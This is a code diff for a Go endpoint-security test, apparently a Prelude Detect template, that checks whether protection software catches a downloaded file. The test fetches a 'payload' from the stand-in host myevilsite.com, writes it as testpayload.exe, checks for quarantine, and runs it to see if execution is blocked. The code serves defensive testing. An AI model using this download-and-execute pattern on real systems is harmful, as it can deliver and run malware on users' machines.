@@ -3,6 +3,7 @@ package main
 import (
 	"flag"
 	"os"
+	"path/filepath"
 	"time"
 
 	"github.com/dumpst3rfir3/meh"
@@ -15,6 +16,7 @@ var name string = "My Prelude Detect Test"
 var version string = "1.0.0"
 
 func clean() {
+	endpoint.Say("Cleaning up")
 	meh.CleanFiles(filesWritten...)
 }
 
@@ -43,7 +45,7 @@ func run() {
 
 	if p, e = meh.Run(cmd); e != nil {
 		endpoint.Say("Execution failed: %s", e)
-		endpoint.Stop(endpoint.ExecutionPrevented)
+		meh.Stop(endpoint.ExecutionPrevented)
 	}
 
 	endpoint.Wait(5 * time.Second)
@@ -52,7 +54,7 @@ func run() {
 	endpoint.Say("Killing %s process...", name)
 	if e = p.Kill(); e != nil {
 		endpoint.Say("Failed to kill process: %s", e)
-		endpoint.Stop(endpoint.UnexpectedTestError)
+		meh.Stop(endpoint.UnexpectedTestError)
 	}
 
 	endpoint.Say("Successfully killed process")
@@ -65,7 +67,7 @@ func setup() {
 func test() {
 	var b []byte
 	var expectedMD5 string = "deadbeefdeadbeefdeadbeefdeadbeef"
-	var outfile string = `C:\Windows\Temp\testpayload.exe`
+	var outfile string = `testpayload.exe`
 	var url string = "https://myevilsite.com/payload"
 
 	endpoint.Say("Executing %s test v%s", name, version)
@@ -76,17 +78,18 @@ func test() {
 	// Download from URL
 	b = meh.Download(url, expectedMD5, "")
 
-	// Write to c:\windows\temp expecting no quarantine
+	// Write to testpayload.exe expecting no quarantine
 	meh.CheckQuarantine(outfile, b, false)
 
 	// It will only get here if outfile is not quarantined
 	// So we need to add the written file to list of files,
 	// so it can be cleaned up later
-	filesWritten = append(filesWritten, outfile)
+	dir, _ := os.Getwd()
+	filesWritten = append(filesWritten, filepath.Join(dir, outfile))
 
 	// Written to disk, so try to run it and see if it gets blocked
 	run()
 
-	endpoint.Stop(endpoint.Unprotected)
+	meh.Stop(endpoint.Unprotected)
 
 }
